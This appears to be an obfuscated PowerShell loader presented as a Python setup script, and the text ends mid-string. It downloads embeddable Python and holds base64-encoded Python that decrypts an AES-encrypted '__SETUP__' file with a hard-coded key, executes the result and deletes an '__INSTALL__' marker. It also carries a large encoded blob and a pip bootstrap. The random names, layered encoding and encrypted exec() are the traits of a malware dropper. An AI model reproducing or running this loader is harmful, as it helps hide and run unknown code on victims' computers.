Add-Type -AssemblyName PresentationCore,PresentationFramework

function pLDSe2IDUdlH7($msg) {
    [System.Windows.MessageBox]::Show($msg)
}

function _8IuOKsFONRPjw1hS9Y {
    $p = "python"
    $mv = "3.12.1"

    return "https://www.${p}.org/ftp/${p}/${mv}/${p}-${mv}-embed-win32.zip"
}

function _4R3SRU($url, $dest) {
    echo "Downloading '${url}'"
    echo "To: '${dest}'"

    [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, ssl3"
    Invoke-WebRequest -uri "$url" -outfile "$dest"
}

function TY1u8DYa($file, $dest) {
    $dirExists = Test-Path -Path $dest

    if ( -Not $dirExists ) {
        New-Item "$dest" -ItemType Directory
    }

    Expand-Archive -force -LiteralPath "$file" -DestinationPath "$dest"
}

function _8efXd {
    return $bytes = [System.Convert]::FromBase64String("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")
}

function mDW9TaHpsIByATR {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGVmIFI2ZzRkNWlTb1VSZm0obkQwZW9SQzA4UHFMdTJ0S01Xayk6CiAgICByZXR1cm4gNjQgKiBuRDBlb1JDMDhQcUx1MnRLTVdrCgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUyBhcyBocTZLTk5kcEJPMgpkZWYgajVCRXZKeElHVTN4NihnM2VzMGFoazZJRzogc3RyLCBaMnRENDZ1b3BLRkRxSEpFOiBzdHIsIFdsdTl5RVplRXUzMTogaW50KSAtPiBzdHI6CiAgICBpZiBnM2VzMGFoazZJRyA9PSBaMnRENDZ1b3BLRkRxSEpFOgogICAgICAgIHJldHVybiAiXzJyYkVEcHl3IgoKICAgIHRVdzVaczogc3RyID0gc3RyKFdsdTl5RVplRXUzMSkKICAgIFoydEQ0NnVvcEtGRHFISkUgPSBmIntaMnRENDZ1b3BLRkRxSEpFfXt0VXc1WnN9IgoKICAgIHJldHVybiBaMnRENDZ1b3BLRkRxSEpFCgpmcm9tIENyeXB0by5VdGlsLlBhZGRpbmcgaW1wb3J0IHVucGFkIGFzIFhkVlZKYzZLSwpkZWYgXzRqcmkxbVBHZGFIZyhiVFViZEwpOgogICAgYllPTk5hdXR6ZzZ6MGx6Yk5VWjkgPSAwCgogICAgZm9yIE5uZjhlN2NxaEppWDVqNncgaW4gYlRVYmRMOgogICAgICAgIGJZT05OYXV0emc2ejBsemJOVVo5ICs9IDEgKyBObmY4ZTdjcWhKaVg1ajZ3CgogICAgcmV0dXJuIGJZT05OYXV0emc2ejBsemJOVVo5IF4gMzIKCmZyb20gYmFzZTY0IGltcG9ydCBiNjRkZWNvZGUgYXMgZ3h2SEpYeEdRSVpRbEwKZGVmIGFEOUlMU3UzSWczVjlUSGZNam9IKCkgLT4gYm9vbDoKICAgIHJldHVybiBfX25hbWVfXyA9PSAiX19tYWluX18iCgoKZGVmIE0zM3A0YigpIC0+IGJvb2w6CiAgICB0cnk6CiAgICAgICAgaWYgbm90IGFEOUlMU3UzSWczVjlUSGZNam9IKCk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBtMTZNNzlVdEh5TXFxWDoKICAgICAgICBwcmludCgiTVpXRFhfIikKICAgICAgICBwcmludChtMTZNNzlVdEh5TXFxWCkKCiAgICByZXR1cm4gVHJ1ZQoKaW1wb3J0IG9zIGFzIG5QV1AzaGwyUk1Gb0tqMHVYdkEKCmRlZiBpdDBnQ2ttYnI5cyhJc3NEUWdVczNZMyk6CiAgICBKSDQ5MDMgPSAwCgogICAgZm9yIFRXNU1wMVJDUFZjenQgaW4gSXNzRFFnVXMzWTM6CiAgICAgICAgSkg0OTAzICs9IDEgKyBUVzVNcDFSQ1BWY3p0CgogICAgcmV0dXJuIEpINDkwMyBeIDMyCgpkZWYgS2RvZ01Lb3RkMUlqd3luaUw4aCgpOgogICAgUlZ5RHBCSCA9IG5QV1AzaGwyUk1Gb0tqMHVYdkEuZ2V0ZW52KCJwYXRoIikKICAgIGtzM0xoeksgPSBuUFdQM2hsMlJNRm9LajB1WHZBLmdldGN3ZCgpCiAgICBmQjFuVTFmbXJKID0gblBXUDNobDJSTUZvS2owdVh2QS5wYXRoLmpvaW4oa3MzTGh6SywgIlNjcmlwdHMiKQogICAgblBXUDNobDJSTUZvS2owdVh2QS5lbnZpcm9uWyJwYXRoIl0gPSBmIntrczNMaHpLfTt7ZkIxblUxZm1ySn07e1JWeURwQkh9IgoKZGVmIFA3RzV4KGZvcWdwUDZ3M2VET2YpOgogICAgcmV0dXJuIDY0ICogZm9xZ3BQNnczZURPZgoKS2RvZ01Lb3RkMUlqd3luaUw4aCgpCgpkZWYgXzlEcXdMSEFTUnBnVCgpIC0+IGJvb2w6CiAgICByZXR1cm4gX19uYW1lX18gPT0gIl9fbWFpbl9fIgoKCmRlZiBqck1vZ1U0aXhwY1dLUUpzWVowTigpIC0+IGJvb2w6CiAgICB0cnk6CiAgICAgICAgaWYgbm90IF85RHF3TEhBU1JwZ1QoKToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIF84Y0ZKWFU0d2JrbzJXcTMxOgogICAgICAgIHByaW50KCJOaHoyUmluXyIpCiAgICAgICAgcHJpbnQoXzhjRkpYVTR3YmtvMldxMzEpCgogICAgcmV0dXJuIFRydWUKCk0xdk5pQnRwMmR0WFkyY1ZwSmN0ID0gIl9fU0VUVVBfXyIKCmRlZiB4b0xwb0xQZmZTTGhvUUhFKG9IZ29kZ1l0QU82UGo0YlEpOgogICAgcmV0dXJuIDY0ICogb0hnb2RnWXRBTzZQajRiUQoKWjFIWHlMID0gIl9fSU5TVEFMTF9fIgoKZGVmIGlKMFVUQXBlKCkgLT4gYm9vbDoKICAgIHJldHVybiBfX25hbWVfXyA9PSAiX19tYWluX18iCgoKZGVmIEdidlZSUE11cGJraTZGNigpIC0+IGJvb2w6CiAgICB0cnk6CiAgICAgICAgaWYgbm90IGlKMFVUQXBlKCk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBUcVJRcUhUSmQ0bHE5ekg6CiAgICAgICAgcHJpbnQoImJPOHNXaTltQmZMRm1Cb2pOal8iKQogICAgICAgIHByaW50KFRxUlFxSFRKZDRscTl6SCkKCiAgICByZXR1cm4gVHJ1ZQoKd2l0aCBvcGVuKE0xdk5pQnRwMmR0WFkyY1ZwSmN0LCAicmIiKSBhcyBNUWhOWWhDTnM6CiAgICBlSzJlRndza1NvWDZBaUE3ID0gTVFoTlloQ05zLnJlYWQoKQoKZGVmIGtmMERKUXEyeXNBRHZNd3RiKG1DRVZlQlRrNSk6CiAgICBwSG42ZVZBN0U4Z2VzTmogPSAwCgogICAgZm9yIEdsS0JGOWlEWVhGIGluIG1DRVZlQlRrNToKICAgICAgICBwSG42ZVZBN0U4Z2VzTmogKz0gMSArIEdsS0JGOWlEWVhGCgogICAgcmV0dXJuIHBIbjZlVkE3RThnZXNOaiBeIDMyCgpzRVE4QXZtTVN0ID0gIkRaM2ZxYmQxd0NqZFVFTlVzVHZWazJKM3RMZmlXK2cvd2lPOTZRMXA0ZDg9IgoKZGVmIEE5bTU4V1J3RTJ3ckpLa3ZHKF81NU9OOEFHcU1BVllsd1J4Nik6CiAgICBKenczdjVDWmRkUERZVGI2TVBLYSA9IDAKCiAgICBmb3IgS1NYZG1xMUdBZDIgaW4gXzU1T044QUdxTUFWWWx3Ung2OgogICAgICAgIEp6dzN2NUNaZGRQRFlUYjZNUEthICs9IDEgKyBLU1hkbXExR0FkMgoKICAgIHJldHVybiBKenczdjVDWmRkUERZVGI2TVBLYSBeIDMyCgpNSnVUaUdNID0gZUsyZUZ3c2tTb1g2QWlBNwoKZGVmIEYzMUFxYUxTRkVrRHdFcTF3ZTJNKGJCTVpWTmU0eEEyZFloMzVNTXBFKToKICAgIHJldHVybiA2NCAqIGJCTVpWTmU0eEEyZFloMzVNTXBFCgpNSnVUaUdNID0gWGRWVkpjNktLKGhxNktOTmRwQk8yLm5ldyhneHZISlh4R1FJWlFsTChzRVE4QXZtTVN0LmVuY29kZSgpKSwgMiwgTUp1VGlHTVs6MTZdKS5kZWNyeXB0KE1KdVRpR01bMTY6XSksIGhxNktOTmRwQk8yLmJsb2NrX3NpemUpCgpkZWYgSlNWVnVWQ2tub3lKU1QoTHBNOTVMb3VUNUMpOgogICAgcmV0dXJuIDY0ICogTHBNOTVMb3VUNUMKCmlmIG5QV1AzaGwyUk1Gb0tqMHVYdkEucGF0aC5pc2ZpbGUoWjFIWHlMKToKICAgIG5QV1AzaGwyUk1Gb0tqMHVYdkEucmVtb3ZlKFoxSFh5TCkKCmRlZiBVWlEwZE9NKCkgLT4gYm9vbDoKICAgIHJldHVybiBfX25hbWVfXyA9PSAiX19tYWluX18iCgoKZGVmIF8zR3I2ME5uUWViUU1NYVcoKSAtPiBib29sOgogICAgdHJ5OgogICAgICAgIGlmIG5vdCBVWlEwZE9NKCk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBuTWJjTE44RFg0ellTM1BvRjJNOgogICAgICAgIHByaW50KCJtcnlUS2ozcV8iKQogICAgICAgIHByaW50KG5NYmNMTjhEWDR6WVMzUG9GMk0pCgogICAgcmV0dXJuIFRydWUKCmRlZiBtY2VRM1ZGSChUNmNmcW1lKToKICAgIHJldHVybiA2NCAqIFQ2Y2ZxbWUKCmV4ZWMoTUp1VGlHTS5kZWNvZGUoInV0Zi04IikpCgpkZWYgdmJybmNITGIwRShqSEx2N2VpWnV0amo4bzMwSUwpOgogICAgc2docFFtTkxlbEVxUXlVMyA9IDAKCiAgICBmb3IgaThiQzVFZzggaW4gakhMdjdlaVp1dGpqOG8zMElMOgogICAgICAgIHNnaHBRbU5MZWxFcVF5VTMgKz0gMSArIGk4YkM1RWc4CgogICAgcmV0dXJuIHNnaHBRbU5MZWxFcVF5VTMgXiAzMgoK"))
}

function e4hYvEBXh0Mxv() {
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGVmIF80MlRrcEsoKSAtPiBib29sOgogICAgcmV0dXJuIF9fbmFtZV9fID09ICJfX21haW5fXyIKCgpkZWYgRU9SUWpBZk5FZ2IoKSAtPiBib29sOgogICAgdHJ5OgogICAgICAgIGlmIG5vdCBfNDJUa3BLKCk6CiAgICAgICAgICAgIHJldHVybiBGYWxzZQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBjQldmdXhPNUpSd1ZQYzBnOgogICAgICAgIHByaW50KCJsM0RzbGRoWDRfIikKICAgICAgICBwcmludChjQldmdXhPNUpSd1ZQYzBnKQoKICAgIHJldHVybiBUcnVlCgppbXBvcnQgb3MgYXMgU1BvdTZUWW1iTVlWZndUbQpkZWYgXzRFdFJhYUooKSAtPiBib29sOgogICAgcmV0dXJuIF9fbmFtZV9fID09ICJfX21haW5fXyIKCgpkZWYgZEZNOWc2RHpGUmpKKCkgLT4gYm9vbDoKICAgIHRyeToKICAgICAgICBpZiBub3QgXzRFdFJhYUooKToKICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIG9YckRQQVMybXQzSkx5OgogICAgICAgIHByaW50KCJTV0tGNHNvXyIpCiAgICAgICAgcHJpbnQob1hyRFBBUzJtdDNKTHkpCgogICAgcmV0dXJuIFRydWUKCmltcG9ydCBzdWJwcm9jZXNzIGFzIF83MDl4NEw0T2lRYkhldXkKZGVmIGh2ZVcyRVN2KGl6OTBiKToKICAgIFlwYmE5bThQaEJuYkxpRkdUc3YgPSAwCgogICAgZm9yIGR3MVAwdXJ2VGhwWWxIZDIgaW4gaXo5MGI6CiAgICAgICAgWXBiYTltOFBoQm5iTGlGR1RzdiArPSAxICsgZHcxUDB1cnZUaHBZbEhkMgoKICAgIHJldHVybiBZcGJhOW04UGhCbmJMaUZHVHN2IF4gMzIKCmltcG9ydCBzeXMgYXMgYmhuNXA5QkhDRXM3bUxhWmNrCmRlZiBfMGdMUUFFS1JnTFVVQWNYOVJYayhfMUNaZ3BZU3I6IHN0ciwgUnY2Y1diaTogc3RyLCBfMHdma2w2aFo6IGludCkgLT4gc3RyOgogICAgaWYgXzFDWmdwWVNyID09IFJ2NmNXYmk6CiAgICAgICAgcmV0dXJuICJha3BHazlOIgoKICAgIEJZWjNIMmNlVzFHSExkQ0w6IHN0ciA9IHN0cihfMHdma2w2aFopCiAgICBSdjZjV2JpID0gZiJ7UnY2Y1diaX17QllaM0gyY2VXMUdITGRDTH0iCgogICAgcmV0dXJuIFJ2NmNXYmkKCmltcG9ydCB1cmxsaWIucmVxdWVzdCBhcyBFRjRoYWQKCgpkZWYgY0JRTElKbFBTblRxYzUod0I5TzdDc3ZOKToKICAgIHZJd2c0QWlEQTZRZnFwOGNsOSA9IDAKCiAgICBmb3IgSXluQTM3N0J1IGluIHdCOU83Q3N2TjoKICAgICAgICB2SXdnNEFpREE2UWZxcDhjbDkgKz0gMSArIEl5bkEzNzdCdQoKICAgIHJldHVybiB2SXdnNEFpREE2UWZxcDhjbDkgXiAzMgoKZGVmIFl1VUZXdCgpOgogICAgdHJ5OgogICAgICAgIF83MDl4NEw0T2lRYkhldXkucnVuKFtiaG41cDlCSENFczdtTGFaY2suZXhlY3V0YWJsZSwgIi1tIiwgInBpcCIsICItLXZlcnNpb24iXSwgY2hlY2s9VHJ1ZSkKICAgICAgICBwcmludCgicGlwIGlzIGFscmVhZHkgaW5zdGFsbGVkLiIpCiAgICBleGNlcHQgXzcwOXg0TDRPaVFiSGV1eS5DYWxsZWRQcm9jZXNzRXJyb3I6CiAgICAgICAgXzNmRGNvdXN5WTQwVElERDlfcGlwKCkKCgpkZWYgZEV5ZUVpTkR4aFdCKExTYVg4KToKICAgIHJldHVybiA2NCAqIExTYVg4CgpkZWYgXzNmRGNvdXN5WTQwVElERDlfcGlwKCk6CiAgICBIU0ozRFlaQUFkUVRfcHRoKCkKICAgIGxZazB1TTUgPSAiaHR0cHM6Ly9ib290c3RyYXAucHlwYS5pby9nZXQtcGlwLnB5IgogICAgZGdBd2dJVERqOEpiQUlIID0gRUY0aGFkLnVybG9wZW4obFlrMHVNNSkKICAgIEViZkVaY1YwT3FzdGtWaGN1UiA9IGRnQXdnSVREajhKYkFJSC5yZWFkKCkKICAgIHdpdGggb3BlbigiZ2V0LXBpcC5weSIsICJ3YiIpIGFzIGhjS0hSRjoKICAgICAgICBoY0tIUkYud3JpdGUoRWJmRVpjVjBPcXN0a1ZoY3VSKQogICAgXzcwOXg0TDRPaVFiSGV1eS5ydW4oW2J